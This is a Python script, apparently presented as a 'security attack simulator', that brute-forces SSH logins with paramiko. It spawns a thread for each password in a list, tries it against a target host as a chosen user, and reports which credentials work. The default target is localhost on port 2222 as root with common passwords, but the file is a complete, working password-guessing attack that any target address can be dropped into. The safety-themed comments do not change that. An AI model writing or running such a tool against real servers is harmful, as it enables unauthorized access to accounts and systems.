import paramiko
import time
import sys
import threading
from typing import List

class SecurityAttackSimulator:
    def __init__(self, target_ip: str, target_port: int, username: str, password_list: List[str]):
        self.target_ip = target_ip
        self.target_port = target_port
        self.username = username
        self.password_list = password_list
        self.thread_lock = threading.Lock()

    def attempt_login(self, password: str) -> None:
        """Attempts a single SSH authentication connection with explicit safety limits."""
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            # Enforce short timeouts to prevent hanging resources
            ssh_client.connect(
                hostname=self.target_ip,
                port=self.target_port,
                username=self.username,
                password=password,
                timeout=2.0,
                banner_timeout=2.0,
                allow_agent=False,
                look_for_keys=False
            )
            with self.thread_lock:
                print(f"[+] Authentication successful: {self.username}@{password}")
            ssh_client.close()
        except paramiko.AuthenticationException:
            with self.thread_lock:
                print(f"[-] Authentication failed: {self.username}@{password}")
        except (paramiko.SSHException, Exception) as error:
            with self.thread_lock:
                print(f"[!] Network/Protocol exception encountered for {password}: {error}", file=sys.stderr)
        finally:
            del ssh_client

    def execute_flood(self) -> None:
        """Spawns concurrent execution threads to simulate a distributed stress event."""
        threads = []
        print(f"[*] Commencing automated authentication flood against {self.target_ip}:{self.target_port}")
        
        for pwd in self.password_list:
            worker = threading.Thread(target=self.attempt_login, args=(pwd,))
            threads.append(worker)
            worker.start()
            time.sleep(0.1) # Small delay to preserve local system stability

        for worker in threads:
            worker.join()
        print("[*] Authentication simulation sequence complete.")

if __name__ == "__main__":
    # Safe fallback values for a local virtualized testing loop
    TARGET = "127.0.0.1" 
    PORT = 2222
    USER = "root"
    PASSWORDS = ["123456", "password", "admin", "secret", "guest", "root123"]
    
    simulator = SecurityAttackSimulator(TARGET, PORT, USER, PASSWORDS)
    simulator.execute_flood()

